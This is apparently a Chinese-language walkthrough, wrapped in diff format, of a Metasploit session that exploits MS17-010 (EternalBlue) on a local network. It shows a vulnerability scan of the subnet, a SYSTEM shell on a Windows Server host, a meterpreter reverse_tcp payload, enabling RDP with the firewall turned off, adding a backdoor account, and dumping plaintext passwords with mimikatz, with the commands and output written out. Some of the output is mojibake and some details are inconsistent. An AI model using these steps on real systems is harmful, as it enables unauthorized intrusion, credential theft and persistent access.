@@ -1,0 +1,596 @@
+root@MyKali:~/桌面# wget https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/smb/smb_ms17_010.rb
+root@MyKali:~/桌面# cp smb_ms17_010.rb /usr/share/metasploit-framework/modules/exploits/linux/samba/
+root@MyKali:/usr/share/metasploit-framework/modules/exploits/windows/smb# msfconsole 
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMM                MMMMMMMMMM
+MMMN$                           vMMMM
+MMMNl  MMMMM             MMMMM  JMMMM
+MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
+MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
+MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
+MMMMR  ?MMNM             MMMMM .dMMMM
+MMMMNm `?MMM             MMMM` dMMMMM
+MMMMMMN  ?MM             MM?  NMMMMMN
+MMMMMMMMNe                 JMMMMMNMMM
+MMMMMMMMMMNm,            eMMMMMNMMNMM
+MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
+MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
+        https://metasploit.com
+
+
+       =[ metasploit v4.16.2-dev                          ]
++ -- --=[ 1677 exploits - 961 auxiliary - 296 post        ]
++ -- --=[ 495 payloads - 40 encoders - 9 nops             ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+msf > search ms17-010
+msf exploit(ms17_010_eternalblue) > workspace -a ms17-010
+[*] Added workspace: ms17-010
+msf exploit(ms17_010_eternalblue) > workspace ms17-010 
+[*] Workspace: ms17-010
+msf exploit(ms17_010_eternalblue) > db_nmap -n -p445 --script smb-vuln-ms17-010 192.168.1.0/24 --open
+[*] Nmap: Starting Nmap 7.60 ( https://nmap.org ) at 2017-09-06 15:17 CST
+[*] Nmap: Stats: 0:00:03 elapsed; 0 hosts completed (0 up), 255 undergoing ARP Ping Scan
+[*] Nmap: ARP Ping Scan Timing: About 75.49% done; ETC: 15:17 (0:00:01 remaining)
+[*] Nmap: Nmap scan report for 192.168.1.5
+[*] Nmap: Host is up (0.00018s latency).
+[*] Nmap: PORT    STATE SERVICE
+[*] Nmap: 445/tcp open  microsoft-ds
+[*] Nmap: MAC Address: 44:A8:42:1E:2D:68 (Dell)
+[*] Nmap: Host script results:
+[*] Nmap: | smb-vuln-ms17-010:
+[*] Nmap: |   VULNERABLE:
+[*] Nmap: |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+[*] Nmap: |     State: VULNERABLE
+[*] Nmap: |     IDs:  CVE:CVE-2017-0143
+[*] Nmap: |     Risk factor: HIGH
+[*] Nmap: |       A critical remote code execution vulnerability exists in Microsoft SMBv1
+[*] Nmap: |        servers (ms17-010).
+[*] Nmap: |
+[*] Nmap: |     Disclosure date: 2017-03-14
+[*] Nmap: |     References:
+[*] Nmap: |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+[*] Nmap: |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+[*] Nmap: |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+[*] Nmap: Nmap scan report for 192.168.1.14
+[*] Nmap: Host is up (-0.076s latency).
+[*] Nmap: PORT    STATE SERVICE
+[*] Nmap: 445/tcp open  microsoft-ds
+[*] Nmap: MAC Address: B0:83:FE:94:B5:BB (Dell)
+[*] Nmap: Nmap scan report for 192.168.1.21
+[*] Nmap: Host is up (-0.076s latency).
+[*] Nmap: PORT    STATE SERVICE
+[*] Nmap: 445/tcp open  microsoft-ds
+[*] Nmap: MAC Address: B0:83:FE:98:94:37 (Dell)
+[*] Nmap: Nmap scan report for 192.168.1.53
+[*] Nmap: Host is up (0.00034s latency).
+[*] Nmap: PORT    STATE SERVICE
+[*] Nmap: 445/tcp open  microsoft-ds
+[*] Nmap: MAC Address: B8:AE:ED:2F:BB:F6 (Elitegroup Computer Systems)
+[*] Nmap: Nmap scan report for 192.168.1.55
+[*] Nmap: Host is up (0.00084s latency).
+[*] Nmap: PORT    STATE SERVICE
+[*] Nmap: 445/tcp open  microsoft-ds
+[*] Nmap: MAC Address: 2C:44:FD:17:D7:07 (Hewlett Packard)
+[*] Nmap: Host script results:
+[*] Nmap: | smb-vuln-ms17-010:
+[*] Nmap: |   VULNERABLE:
+[*] Nmap: |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+[*] Nmap: |     State: VULNERABLE
+[*] Nmap: |     IDs:  CVE:CVE-2017-0143
+[*] Nmap: |     Risk factor: HIGH
+[*] Nmap: |       A critical remote code execution vulnerability exists in Microsoft SMBv1
+[*] Nmap: |        servers (ms17-010).
+[*] Nmap: |
+[*] Nmap: |     Disclosure date: 2017-03-14
+[*] Nmap: |     References:
+[*] Nmap: |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+[*] Nmap: |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+[*] Nmap: |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+[*] Nmap: Nmap scan report for 192.168.1.59
+[*] Nmap: Host is up (0.00029s latency).
+[*] Nmap: PORT    STATE SERVICE
+[*] Nmap: 445/tcp open  microsoft-ds
+[*] Nmap: MAC Address: 00:E0:4C:51:00:18 (Realtek Semiconductor)
+[*] Nmap: Nmap scan report for 192.168.1.90
+[*] Nmap: Host is up (0.00025s latency).
+[*] Nmap: PORT    STATE SERVICE
+[*] Nmap: 445/tcp open  microsoft-ds
+[*] Nmap: MAC Address: 00:E0:4C:51:00:03 (Realtek Semiconductor)
+[*] Nmap: Nmap scan report for 192.168.1.146
+[*] Nmap: Host is up (0.00058s latency).
+[*] Nmap: PORT    STATE SERVICE
+[*] Nmap: 445/tcp open  microsoft-ds
+[*] Nmap: MAC Address: B8:2A:72:F6:A7:E6 (Dell)
+[*] Nmap: Host script results:
+[*] Nmap: | smb-vuln-ms17-010:
+[*] Nmap: |   VULNERABLE:
+[*] Nmap: |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+[*] Nmap: |     State: VULNERABLE
+[*] Nmap: |     IDs:  CVE:CVE-2017-0143
+[*] Nmap: |     Risk factor: HIGH
+[*] Nmap: |       A critical remote code execution vulnerability exists in Microsoft SMBv1
+[*] Nmap: |        servers (ms17-010).
+[*] Nmap: |
+[*] Nmap: |     Disclosure date: 2017-03-14
+[*] Nmap: |     References:
+[*] Nmap: |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+[*] Nmap: |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+[*] Nmap: |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+[*] Nmap: Nmap done: 256 IP addresses (48 hosts up) scanned in 5.06 seconds
+msf > hosts
+
+Hosts
+=====
+
+address        mac                name  os_name  os_flavor  os_sp  purpose  info  comments
+-------        ---                ----  -------  ---------  -----  -------  ----  --------
+192.168.1.5    44:a8:42:1e:2d:68        Unknown                    device         
+192.168.1.14   b0:83:fe:94:b5:bb        Unknown                    device         
+192.168.1.21   b0:83:fe:98:94:37        Unknown                    device         
+192.168.1.53   b8:ae:ed:2f:bb:f6        Unknown                    device         
+192.168.1.55   2c:44:fd:17:d7:07        Unknown                    device         
+192.168.1.59   00:e0:4c:51:00:18        Unknown                    device         
+192.168.1.90   00:e0:4c:51:00:03        Unknown                    device         
+192.168.1.146  b8:2a:72:f6:a7:e6        Unknown                    device         
+
+msf > search ms17-010
+
+Matching Modules
+================
+
+   Name                                      Disclosure Date  Rank     Description
+   ----                                      ---------------  ----     -----------
+   auxiliary/scanner/smb/smb_ms17_010                         normal   MS17-010 SMB RCE Detection
+   exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+
+
+msf auxiliary(smb_ms17_010) > use exploit/windows/smb/ms17_010_eternalblue
+msf exploit(ms17_010_eternalblue) > show options 
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name                Current Setting  Required  Description
+   ----                ---------------  --------  -----------
+   GroomAllocations    12               yes       Initial number of times to groom the kernel pool.
+   GroomDelta          5                yes       The amount to increase the groom count by per try.
+   MaxExploitAttempts  3                yes       The number of times to retry the exploit.
+   ProcessName         spoolsv.exe      yes       Process to inject payload into.
+   RHOST                                yes       The target address
+   RPORT               445              yes       The target port (TCP)
+   SMBDomain           .                no        (Optional) The Windows domain to use for authentication
+   SMBPass                              no        (Optional) The password for the specified username
+   SMBUser                              no        (Optional) The username to authenticate as
+   VerifyArch          true             yes       Check if remote architecture matches exploit Target.
+   VerifyTarget        true             yes       Check if remote OS matches exploit Target.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+
+msf exploit(ms17_010_eternalblue) > set RHOST 192.168.1.5
+RHOST => 192.168.1.5
+msf exploit(ms17_010_eternalblue) > exploit 
+
+[*] Started reverse TCP handler on 192.168.1.99:4444 
+[*] 192.168.1.5:445 - Connecting to target for exploitation.
+[+] 192.168.1.5:445 - Connection established for exploitation.
+[+] 192.168.1.5:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 192.168.1.5:445 - CORE raw buffer dump (51 bytes)
+[*] 192.168.1.5:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
+[*] 192.168.1.5:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard 
+[*] 192.168.1.5:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
+[*] 192.168.1.5:445 - 0x00000030  6b 20 31                                         k 1             
+[+] 192.168.1.5:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 192.168.1.5:445 - Trying exploit with 12 Groom Allocations.
+[*] 192.168.1.5:445 - Sending all but last fragment of exploit packet
+[*] 192.168.1.5:445 - Starting non-paged pool grooming
+[+] 192.168.1.5:445 - Sending SMBv2 buffers
+[+] 192.168.1.5:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 192.168.1.5:445 - Sending final SMBv2 buffers.
+[*] 192.168.1.5:445 - Sending last fragment of exploit packet!
+[*] 192.168.1.5:445 - Receiving response from exploit packet
+[+] 192.168.1.5:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 192.168.1.5:445 - Sending egg to corrupted connection.
+[*] 192.168.1.5:445 - Triggering free of corrupted buffer.
+[*] Command shell session 1 opened (192.168.1.99:4444 -> 192.168.1.5:58223) at 2017-09-06 15:22:39 +0800
+[+] 192.168.1.5:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 192.168.1.5:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 192.168.1.5:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+Microsoft Windows [�汾 6.1.7601]
+��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����
+
+C:\Windows\system32>help
+help
+�й�ĳ����������ϸ��Ϣ�������� HELP ������
+ASSOC          ��ʾ���޸��ļ���չ��������
+ATTRIB         ��ʾ�������ļ����ԡ�
+BREAK          ���û�������չʽ CTRL+C ���顣
+BCDEDIT        �����������ݿ��е������Կ����������ء�
+CACLS          ��ʾ���޸��ļ��ķ��ʿ����б�(ACL)��
+CALL           ����һ������������������һ����
+CD             ��ʾ��ǰĿ¼�����ƻ��������ġ�
+CHCP           ��ʾ�����û����ҳ����
+CHDIR          ��ʾ��ǰĿ¼�����ƻ��������ġ�
+CHKDSK         �������̲���ʾ״̬���档
+CHKNTFS        ��ʾ���޸�����ʱ�����̼��顣
+CLS            ������Ļ��
+CMD            ������һ�� Windows �������ͳ��򴰿ڡ�
+COLOR          ����Ĭ�Ͽ���̨ǰ���ͱ�����ɫ��
+COMP           �Ƚ������������ļ������ݡ�
+COMPACT        ��ʾ������ NTFS �������ļ���ѹ����
+CONVERT        �� FAT ��ת���� NTFS��������ת��
+               ��ǰ��������
+COPY           ������һ���ļ����Ƶ���һ��λ�á�
+DATE           ��ʾ���������ڡ�
+DEL            ɾ������һ���ļ���
+DIR            ��ʾһ��Ŀ¼�е��ļ�����Ŀ¼��
+DISKCOMP       �Ƚ��������̵����ݡ�
+DISKCOPY       ��һ�����̵����ݸ��Ƶ���һ�����̡�
+DISKPART       ��ʾ�����ô��̷������ԡ�
+DOSKEY         �༭�����С����� Windows ��������ꡣ
+DRIVERQUERY    ��ʾ��ǰ�豸��������״̬�����ԡ�
+ECHO           ��ʾ��Ϣ�������������Դ򿪻����ϡ�
+ENDLOCAL       �������ļ��л������ĵı��ػ���
+ERASE          ɾ��һ���������ļ���
+EXIT           �˳� CMD.EXE ����(�������ͳ���)��
+FC             �Ƚ������ļ��������ļ�������ʾ����֮���Ĳ�ͬ��
+FIND           ��һ���������ļ�������һ���ı��ַ�����
+FINDSTR        �ڶ����ļ��������ַ�����
+FOR            Ϊһ���ļ��е�ÿ���ļ�����һ��ָ�������
+FORMAT         ��ʽ�����̣��Ա��� Windows ʹ�á�
+FSUTIL         ��ʾ�������ļ�ϵͳ�����ԡ�
+FTYPE          ��ʾ���޸������ļ���չ���������ļ����͡�
+GOTO           �� Windows �������ͳ���ָ������������
+               ��ĳ������ǩ���С�
+GPRESULT       ��ʾ�������û�����������Ϣ��
+GRAFTABL       ���� Windows ��ͼ��ģʽ��ʾ��չ�ַ�����
+HELP           �ṩ Windows �����İ�����Ϣ��
+ICACLS         ��ʾ���޸ġ����ݻ���ԭ�ļ���
+ Ŀ¼�� ACL��
+IF             ��������������ִ���������Ĵ������̡�
+LABEL          ���������Ļ�ɾ�����̵ľ��ꡣ
+MD             ����һ��Ŀ¼��
+MKDIR          ����һ��Ŀ¼��
+MKLINK         �����������Ӻ�Ӳ����
+MODE           ����ϵͳ�豸��
+MORE           ������ʾ������
+MOVE           ��һ���������ļ���һ��Ŀ¼�ƶ�����һ��Ŀ¼��
+OPENFILES      ��ʾԶ���û�Ϊ���ļ��������򿪵��ļ���
+PATH           Ϊ��ִ���ļ���ʾ����������·����
+PAUSE          ֹͣ�������ļ��Ĵ�������ʾ��Ϣ��
+POPD           ��ԭ�� PUSHD �����ĵ�ǰĿ¼��һ�ε�ֵ��
+PRINT          ��ӡһ���ı��ļ���
+PROMPT         �ı� Windows ������ʾ��
+PUSHD          ���浱ǰĿ¼��Ȼ���������и��ġ�
+RD             ɾ��Ŀ¼��
+RECOVER        ���𻵵Ĵ����лָ��ɶ�ȡ����Ϣ��
+REM            ��¼�������ļ��� CONFIG.SYS �е�ע�͡�
+REN            ���������ļ���
+RENAME         ���������ļ���
+REPLACE        �滻�ļ���
+RMDIR          ɾ��Ŀ¼��
+ROBOCOPY       �����ļ���Ŀ¼���ĸ߼�ʵ�ó���
+SET            ��ʾ�����û�ɾ�� Windows ����������
+SETLOCAL       ��ʼ�����ļ��ı价���ı��ػ���
+SC             ��ʾ�����÷���(��̨����)��
+SCHTASKS       ���������ͳ�����һ���������ϰ��ƻ����С�
+SHIFT          �����������ļ��п��滻������λ�á�
+SHUTDOWN       �û����ڱ��ػ�Զ����ȷ�رա�
+SORT           ������������
+START          �򿪵����Ӵ�����ָ�����������
+SUBST          ������������·��������
+SYSTEMINFO     ��ʾ�����ľ��������Ժ����á�
+TASKLIST       ��ʾ�������������е�ǰ���е�������
+TASKKILL       ��ֹ�������еĽ��̻�Ӧ�ó�����
+TIME           ��ʾ������ϵͳʱ�䡣
+TITLE          ���� CMD.EXE �Ự�Ĵ��ڱ��⡣
+TREE           ��ͼ����ʾ��������·����Ŀ¼�ṹ��
+TYPE           ��ʾ�ı��ļ������ݡ�
+VER            ��ʾ Windows �İ汾��
+VERIFY         ���� Windows ��֤�ļ��Ƿ���ȷд�����̡�
+VOL            ��ʾ���̾��������кš�
+XCOPY          �����ļ���Ŀ¼����
+WMIC           �ڽ���������������ʾ WMI ��Ϣ
+C:\Windows\system32>nslookup
+nslookup
+Ĭ�Ϸ�����:  UnKnown
+Address:  ::1
+
+> exit
+
+C:\Windows\system32>dir
+dir
+ ������ C �еľ�û�б�ǩ��
+ �������к��� 2040-2153
+
+ C:\Windows\system32 ��Ŀ¼
+
+2017/09/03  20:12    <DIR>          .
+2017/09/03  20:12    <DIR>          ..
+2010/11/22  02:52    <DIR>          0409
+2010/11/21  11:24           158,720 aaclient.dll
+2010/11/21  11:24         3,745,792 accessibilitycpl.dll
+2009/07/14  09:24            39,424 ACCTRES.dll
+2009/07/14  09:40             9,216 acledit.dll
+2009/07/14  09:40           154,112 aclui.dll
+2010/11/21  11:24            53,248 acppage.dll
+.................................................
+2009/07/14  07:25            34,304 format.com
+2010/11/21  11:24           121,344 fphc.dll
+2009/07/14  11:20    <DIR>          fr-FR
+2009/07/14  07:38            14,848 framebuf.dll
+2010/11/21  11:24           279,040 framedyn.dll
+2010/11/21  11:24           295,936 framedynos.dll
+2009/06/11  04:38           144,909 fsmgmt.msc
+2009/07/14  09:39            96,256 fsutil.exe
+2010/11/21  11:24            48,128 ftp.exe
+2009/07/14  09:40           194,560 fundisc.dll
+2009/07/14  09:40           111,616 fwcfg.dll
+2009/07/14  09:40           324,096 FWPUCLNT.DLL
+2009/07/14  09:40            75,776 FwRemoteSvr.dll
+2012/08/14  12:53           220,160 G200eRd^C
+
+下面是带payload的效果
+msf exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf exploit(ms17_010_eternalblue) > show options 
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name                Current Setting  Required  Description
+   ----                ---------------  --------  -----------
+   GroomAllocations    12               yes       Initial number of times to groom the kernel pool.
+   GroomDelta          5                yes       The amount to increase the groom count by per try.
+   MaxExploitAttempts  3                yes       The number of times to retry the exploit.
+   ProcessName         spoolsv.exe      yes       Process to inject payload into.
+   RHOST                                yes       The target address
+   RPORT               445              yes       The target port (TCP)
+   SMBDomain           .                no        (Optional) The Windows domain to use for authentication
+   SMBPass                              no        (Optional) The password for the specified username
+   SMBUser                              no        (Optional) The username to authenticate as
+   VerifyArch          true             yes       Check if remote architecture matches exploit Target.
+   VerifyTarget        true             yes       Check if remote OS matches exploit Target.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+
+
+msf exploit(ms17_010_eternalblue) > set RHOST 192.168.1.21
+RHOST => 192.168.1.21
+msf exploit(ms17_010_eternalblue) > exploit 
+
+[-] 192.168.1.21:445 - Exploit failed: The following options failed to validate: LHOST.
+[*] Exploit completed, but no session was created.
+msf exploit(ms17_010_eternalblue) > set LHOST 192.168.1.99
+LHOST => 192.168.1.99
+msf exploit(ms17_010_eternalblue) > exploit 
+
+
+
+
+（3）开启远程桌面 
+
+1. > meterpreter > run post/windows/manage/enable_rdp 
+
+2. 此命令可以帮我们一建开启远程桌面，并帮我们关闭防火墙，真的牛xxx.
+
+注：一开始使用命令 run getgui -u admin -p passw0rd 没能开启远程RDP桌面，后来才查询到上面这个攻击脚本。当然并不是说，就不能用哦。
+
+（4）添加账号 
+
+直接进入系统shell,添加账号（结果失败）
+
+1
+2
+	
+1.> shell
+2.> net user test 123 /add
+
+3. ... # 一直没有回显，怀疑是由于安装了360导致的，后来进过验证的确是这原因，所有说安装个360还是很有用的，不要总是说人家是流氓软件，不是打广告哈,切实感受...
+
+（5）获取系统管理密码 
+
+想直接添加账号进行提权，前面操作是不了，那么我们现在就出杀手锏，直接使用mimikatz来获取系统管理账号的密码。 
+
+第一步：载入mimikatz
+
+1. meterpreter > load mimikatz
+
+第二步：使用命令wdigest获取密码
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+	
+1.meterpreter > wdigest
+2.[+] Running as SYSTEM
+3.[*] Retrieving wdigest credentials
+4.wdigest credentials
+5.===================
+6.
+7.AuthID    Package    Domain        User           Password
+8.------    -------    ------        ----           --------
+9.0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  
+10.0;996     Negotiate  WORKGROUP     CHINAMAN-PC$   
+11.0;47327   NTLM                                    
+12.0;999     NTLM       WORKGROUP     CHINAMAN-PC$   
+13.0;636147  NTLM       ChinaMan-PC   ChinaMan       mima-009
+14.>
+
+注：Mimikatz 的命令帮助：
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+	
+1.Mimikatz Commands
+2.=================
+3.
+4.    Command           Description
+5.    -------           -----------
+6.    kerberos          Attempt to retrieve kerberos creds
+7.    livessp           Attempt to retrieve livessp creds
+8.    mimikatz_command  Run a custom command
+9.    msv               Attempt to retrieve msv creds (hashes)
+10.    ssp               Attempt to retrieve ssp creds
+11.    tspkg             Attempt to retrieve tspkg creds
+12.    wdigest           Attempt to retrieve wdigest creds
+
+（6）远程桌面连接之 
+
+另开启一个terminal，使用名rdesktop 连接远程桌面 
+1
+	
+1.root# rdesktop 192.168.1.112 -u user -p passw0rd
+
+
+
+
+
+
+
+
+
+C:\Users\zhangyikai\Desktop>net user test 521820973test /add
+net user test 521820973test /add
+命令成功完成。
+
+
+C:\Users\zhangyikai\Desktop>help
+help
+有关某个命令的详细信息，请键入 HELP 命令名
+ASSOC          显示或修改文件扩展名关联。
+ATTRIB         显示或更改文件属性。
+BREAK          设置或清除扩展式 CTRL+C 检查。
+BCDEDIT        设置启动数据库中的属性以控制启动加载。
+CACLS          显示或修改文件的访问控制列表(ACL)。
+CALL           从另一个批处理程序调用这一个。
+CD             显示当前目录的名称或将其更改。
+CHCP           显示或设置活动代码页数。
+CHDIR          显示当前目录的名称或将其更改。
+CHKDSK         检查磁盘并显示状态报告。
+CHKNTFS        显示或修改启动时间磁盘检查。
+CLS            清除屏幕。
+CMD            打开另一个 Windows 命令解释程序窗口。
+COLOR          设置默认控制台前景和背景颜色。
+COMP           比较两个或两套文件的内容。
+COMPACT        显示或更改 NTFS 分区上文件的压缩。
+CONVERT        将 FAT 卷转换成 NTFS。您不能转换
+               当前驱动器。
+COPY           将至少一个文件复制到另一个位置。
+DATE           显示或设置日期。
+DEL            删除至少一个文件。
+DIR            显示一个目录中的文件和子目录。
+DISKCOMP       比较两个软盘的内容。
+DISKCOPY       将一个软盘的内容复制到另一个软盘。
+DISKPART       显示或配置磁盘分区属性。
+DOSKEY         编辑命令行、调用 Windows 命令并创建宏。
+DRIVERQUERY    显示当前设备驱动程序状态和属性。
+ECHO           显示消息，或将命令回显打开或关上。
+ENDLOCAL       结束批文件中环境更改的本地化。
+ERASE          删除一个或多个文件。
+EXIT           退出 CMD.EXE 程序(命令解释程序)。
+FC             比较两个文件或两个文件集并显示它们之间的不同。
+FIND           在一个或多个文件中搜索一个文本字符串。
+FINDSTR        在多个文件中搜索字符串。
+FOR            为一套文件中的每个文件运行一个指定的命令。
+FORMAT         格式化磁盘，以便跟 Windows 使用。
+FSUTIL         显示或配置文件系统的属性。
+FTYPE          显示或修改用在文件扩展名关联的文件类型。
+GOTO           将 Windows 命令解释程序指向批处理程序
+               中某个带标签的行。
+GPRESULT       显示机器或用户的组策略信息。
+GRAFTABL       启用 Windows 在图形模式显示扩展字符集。
+HELP           提供 Windows 命令的帮助信息。
+ICACLS         显示、修改、备份或还原文件和
+ 目录的 ACL。
+IF             在批处理程序中执行有条件的处理过程。
+LABEL          创建、更改或删除磁盘的卷标。
+MD             创建一个目录。
+MKDIR          创建一个目录。
+MKLINK         创建符号链接和硬链接
+MODE           配置系统设备。
+MORE           逐屏显示输出。
+MOVE           将一个或多个文件从一个目录移动到另一个目录。
+OPENFILES      显示远程用户为了文件共享而打开的文件。
+PATH           为可执行文件显示或设置搜索路径。
+PAUSE          停止批处理文件的处理并显示信息。
+POPD           还原由 PUSHD 保存的当前目录上一次的值。
+PRINT          打印一个文本文件。
+PROMPT         改变 Windows 命令提示。
+PUSHD          保存当前目录，然后对其进行更改。
+RD             删除目录。
+RECOVER        从损坏的磁盘中恢复可读取的信息。
+REM            记录批处理文件或 CONFIG.SYS 中的注释。
+REN            重新命名文件。
+RENAME         重新命名文件。
+REPLACE        替换文件。
+RMDIR          删除目录。
+ROBOCOPY       复制文件和目录树的高级实用程序
+SET            显示、设置或删除 Windows 环境变量。
+SETLOCAL       开始用批文件改变环境的本地化。
+SC             显示或配置服务(后台处理)。
+SCHTASKS       安排命令和程序在一部计算机上按计划运行。
+SHIFT          调整批处理文件中可替换参数的位置。
+SHUTDOWN       让机器在本地或远程正确关闭。
+SORT           将输入排序。
+START          打开单独视窗运行指定程序或命令。
+SUBST          将驱动器号与路径关联。
+SYSTEMINFO     显示机器的具体的属性和配置。
+TASKLIST       显示包括服务的所有当前运行的任务。
+TASKKILL       终止正在运行的进程或应用程序。
+TIME           显示或设置系统时间。
+TITLE          设置 CMD.EXE 会话的窗口标题。
+TREE           以图形显示启动器或路径的目录结构。
+TYPE           显示文本文件的内容。
+VER            显示 Windows 的版本。
+VERIFY         告诉 Windows 验证文件是否正确写入磁盘。
+VOL            显示磁盘卷标和序列号。
+XCOPY          复制文件和目录树。
+WMIC           在交互命令外壳里显示 WMI 信息。
+
+有关工具的详细信息，请参阅联机帮助中的命令行参考。
+
